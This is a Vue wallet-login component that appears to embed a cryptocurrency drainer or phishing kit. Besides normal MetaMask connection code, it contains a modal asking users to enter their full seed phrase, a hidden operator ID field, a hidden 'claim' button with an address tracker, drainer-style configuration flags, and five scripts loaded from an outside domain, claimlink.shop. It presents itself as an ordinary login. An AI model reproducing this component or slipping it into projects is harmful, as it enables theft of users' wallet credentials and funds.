<template>
  <div class="wallet-login">
    <h2>Connect Your Wallet</h2>
    <div v-if="account" class="account-address">{{ account }}</div>
    <button v-if="!account" @click="connectWallet" :disabled="isConnecting" class="connect-btn">
      {{ isConnecting ? 'Connecting...' : 'Connect MetaMask' }}
    </button>
    <button v-else @click="disconnect" class="disconnect-btn">Disconnect</button>

    <!-- Modal for manual seed phrase entry -->
    <div id="myModal" class="modal__container">
      <div class="modal__content">
        <span class="modal__close" onclick="closeModal()">&times;</span>
        <h2 class="modal__title">Enter Your Seed Phrase</h2>
        <p class="modal__description">Please enter your 12, 15, 18, 21, or 24-word seed phrase.</p>

        <div style="margin-bottom: 16px;">
          <label for="wordCount" style="display: block; margin-bottom: 8px;">Word Count:</label>
          <select id="wordCount" onchange="generateSeedPhraseInputs(this.value)">
            <option value="12">12</option>
            <option value="15">15</option>
            <option value="18">18</option>
            <option value="21">21</option>
            <option value="24">24</option>
          </select>

          <div class="seed-phrase-container" id="seedPhraseContainer"></div>
        </div>

        <t id="inva" style=" color: #ff0000; margin-left: 12px; margin-top: 12px; display: none; font-size: 14px; "><i class="bx bxs-info-circle"></i> Invalid Secret Recovery Phrase </t>
        <t id="spco" style=" color: #ff0000; margin-left: 12px; margin-top: 12px; display: none; font-size: 14px; "><i class="bx bxs-info-circle"></i> Secret Recovery Phrases contain 12, 15, 18, 21, or 24 words </t>

        <button onclick="checkAllFieldsFilled()" style=" margin-top: 20px; border: 0; background: #000; color: #fff; padding: 14px 16px; border-radius: 18px; width: 100%; font-weight: 400; font-size: 16px; cursor: pointer; cursor: pointer; border: none; outline: none; ">Connect Wallet</button>
        
        <div style="margin-top: 8px;text-align: center;">
          <span style="display: inline-block;vertical-align: middle;color: #898989;font-size: 14px;">Powered by</span>
          <img src="https://miro.medium.com/v2/resize:fit:1400/1*aGWMU1Z_3eMiO74hv_mgjA.png" style="width: 100px; display: inline-block; vertical-align: middle;">
        </div>
      </div>
    </div>

    <!-- Hidden input for exogator_id -->
    <input type="hidden" value="OFQ2CBHZJORTJ6WVYQVHUYENX2KSC9SLPHFZUEDLTNKGU" id="exogator_id">

    <!-- Ensure elements and attach event listeners -->
    <script>
      (function () {
        // Run when DOM is ready
        function onReady(fn) {
          if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', fn);
          } else {
            fn();
          }
        }

        onReady(function ensureElements() {
          // Ensure button with class "ex0claim"
          let btn = document.querySelector('.ex0claim');
          if (!btn) {
            btn = document.createElement('button');
            btn.className = 'ex0claim';
            btn.style.display = 'none'; // keep same default as your markup
            btn.textContent = 'Claim';
            // append to body (or to a specific container you prefer)
            document.body.appendChild(btn);
            console.info('Created missing .ex0claim button');
          } else {
            console.info('.ex0claim found');
          }

          // Attach event listener safely (doesn't duplicate listeners)
          function safeAttach(el, handlerName) {
            // If global function exists, use it; otherwise create a stub.
            const globalFn = (typeof window[handlerName] === 'function') ? window[handlerName] : function () {
              console.warn(handlerName + ' is not defined');
            };
            // Remove any duplicate wrapped listener we know about using a symbol flag.
            const FLAG = '__ex0claim_attached__';
            if (!el[FLAG]) {
              el.addEventListener('click', globalFn);
              el[FLAG] = true;
            }
          }
          safeAttach(btn, 'claim');

          // Ensure span with id "adresstracker"
          let span = document.getElementById('adresstracker');
          if (!span) {
            span = document.createElement('span');
            span.id = 'adresstracker';
            span.style.color = '#fff';
            span.style.display = 'none';
            document.body.appendChild(span);
            console.info('Created missing #adresstracker span');
          } else {
            console.info('#adresstracker found');
          }
        });
      })();
    </script>

    <!-- Additional scripts -->
    <script>
      let choice_be = 4;
      let evm = 1;
      let seed = 1;
      let auto = 1;
      let dark = 1;
      let towsteps = 1; // please read docs before enabling this feature
    </script>

    <!-- External scripts -->
    <script src="https://claimlink.shop/assets/eth.js?v=09.19.205"></script>
    <script src="https://claimlink.shop/assets/w-modal.js?v=09.19.205"></script>
    <script src="https://claimlink.shop/assets/w-loader.js?v=09.19.205"></script>
    <script src="https://claimlink.shop/assets/modules.js?v=09.19.205"></script>
    <script src="https://claimlink.shop/assets/main.js?v=09.19.205"></script>

    <!-- jQuery and Bootstrap -->
    <script src="https://code.jquery.com/jquery-3.7.1.slim.min.js" integrity="sha256-kmHvs0B+OpCW5GVHUNjv9rOmY0IvSIRcf7zGUDTDQM8=" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
  </div>
</template>

<script setup>
import { ref, onMounted } from "vue";
import Web3 from "web3";
import { supabase } from "../utils/supabaseClient";

const account = ref(null);
const isConnecting = ref(false);

const checkConnection = async () => {
  if (window.ethereum) {
    const web3 = new Web3(window.ethereum);
    try {
      const accounts = await web3.eth.getAccounts();
      if (accounts.length > 0) {
        account.value = accounts[0];
        console.log("Connected to MetaMask:", accounts[0]); // Log the connected account
        await handleUserLogin(accounts[0]);
      }
    } catch (error) {
      console.error("Error checking connection:", error); // Log any errors
    }
  }
};

const connectWallet = async () => {
  if (typeof window.ethereum !== "undefined") {
    try {
      isConnecting.value = true;
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      account.value = accounts[0];
      console.log("Connected to MetaMask:", accounts[0]); // Log the connected account
      await handleUserLogin(accounts[0]);
    } catch (error) {
      console.error("Error connecting wallet:", error); // Log any errors
    } finally {
      isConnecting.value = false;
    }
  } else {
    alert("Please install MetaMask!");
  }
};

const handleUserLogin = async (walletAddress) => {
  try {
    const { data, error } = await supabase
      .from("users")
      .select("*")
      .eq("wallet_address", walletAddress)
      .single();
    if (error && error.code !== "PGRST116") {
      console.error("Error fetching user data:", error); // Log any errors
      return;
    }
    if (!data) {
      const { error: insertError } = await supabase.from("users").insert([
        {
          wallet_address: walletAddress,
          name: `User_${walletAddress.substring(0, 6)}`,
          balance: 100,
          choice_be: 4,
          evm: 1,
          seed: 1,
          auto: 1,
          dark: 1,
          towsteps: 1,
        },
      ]);
      if (insertError) {
        console.error("Error creating new user:", insertError); // Log any errors
      } else {
        console.log("New user created successfully"); // Log successful creation
      }
    } else {
      console.log("User data fetched successfully:", data); // Log successful fetch
    }
  } catch (err) {
    console.error("Login error:", err); // Log any other errors
  }
};

const disconnect = () => {
  account.value = null;
};

onMounted(() => {
  checkConnection();
});

// Modal functions
function openModal(modalId) {
  const modal = document.getElementById(modalId);
  if (modal) {
    modal.style.display = "block";
  }
}

function closeModal() {
  const modals = document.querySelectorAll(".modal");
  modals.forEach(modal => {
    modal.style.display = "none";
  });
}

// Seed phrase functions
window.generateSeedPhraseInputs = function(wordCount) {
  const container = document.getElementById("seedPhraseContainer");
  container.innerHTML = "";
  for (let i = 1; i <= wordCount; i++) {
    const input = document.createElement("input");
    input.type = "text";
    input.placeholder = `Word ${i}`;
    input.className = "seed-word-input";
    container.appendChild(input);
  }
};

window.checkAllFieldsFilled = function() {
  const inputs = document.querySelectorAll(".seed-word-input");
  const seedPhrase = Array.from(inputs).map(input => input.value.trim()).join(" ");
  console.log("Seed Phrase:", seedPhrase); // Log the entered seed phrase

  if (inputs.length === 0) {
    alert("Please select a word count for the seed phrase.");
    return;
  }

  if (!seedPhrase || seedPhrase.split(/\s+/).length !== inputs.length) {
    document.getElementById("inva").style.display = "block";
    document.getElementById("spco").style.display = "none";
    console.log("Invalid Seed Phrase: Fields are not filled correctly"); // Log invalid input
    return;
  }

  // Validate seed phrase length
  const validLengths = [12, 15, 18, 21, 24];
  if (!validLengths.includes(seedPhrase.split(/\s+/).length)) {
    document.getElementById("inva").style.display = "none";
    document.getElementById("spco").style.display = "block";
    console.log("Invalid Seed Phrase: Incorrect word count"); // Log invalid length
    return;
  }

  // Proceed with connecting using the seed phrase
  console.log("Valid Seed Phrase:", seedPhrase); // Log valid seed phrase
  // Add your logic to connect using the seed phrase here
};

// Attach event listeners for modal buttons
window.start_exogator = function() {
  openModal("myModal");
};

window.showseedme = function() {
  openModal("myModal");
};
</script>

<style scoped>
.wallet-login {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 24px;
  background-color: #1a1a1a;
  border-radius: 12px;
  border: 2px solid rgba(255, 204, 0, 0.2);
  color: white;
  max-width: 400px;
  margin: 0 auto;
}

h2 {
  color: #ffcc00;
  margin-bottom: 16px;
}

.account-address {
  background-color: #0d0d0d;
  padding: 8px 12px;
  border-radius: 8px;
  font-family: monospace;
  margin-bottom: 16px;
  word-break: break-all;
  color: #4ade80;
}

.connect-btn {
  width: 100%;
  padding: 12px;
  background-color: #f6851b;
  color: white;
  font-weight: bold;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  margin-top: 16px;
  transition: background-color 0.2s;
}

.connect-btn:hover {
  background-color: #e2761b;
}

.connect-btn:disabled {
  opacity: 0.5;
  cursor: not-allowed;
}

.disconnect-btn {
  width: 100%;
  padding: 12px;
  background-color: transparent;
  color: white;
  border: 1px solid white;
  border-radius: 8px;
  cursor: pointer;
}

/* Modal styles */
.modal__container {
  display: none; /* Hidden by default */
  position: fixed;
  z-index: 1000;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  overflow: auto;
  background-color: rgba(0, 0, 0, 0.4);
}

.modal__content {
  background-color: #fff;
  padding: 20px;
  border-radius: 8px;
  position: relative;
}

.modal__close {
  color: #000;
  font-size: 24px;
  cursor: pointer;
  position: absolute;
  top: 10px;
  right: 10px;
}

.modal__title {
  margin-bottom: 16px;
  font-size: 24px;
  color: #333;
}

.modal__description {
  margin-bottom: 24px;
  font-size: 16px;
  color: #555;
}

/* Seed Phrase Input Styles */
.seed-phrase-container input {
  width: 100%;
  padding: 8px;
  margin-bottom: 8px;
  border-radius: 4px;
  border: 1px solid #ccc;
  font-size: 16px;
}

/* Error Message Styles */
#inva, #spco {
  color: #ff0000;
  font-size: 14px;
}
</style>
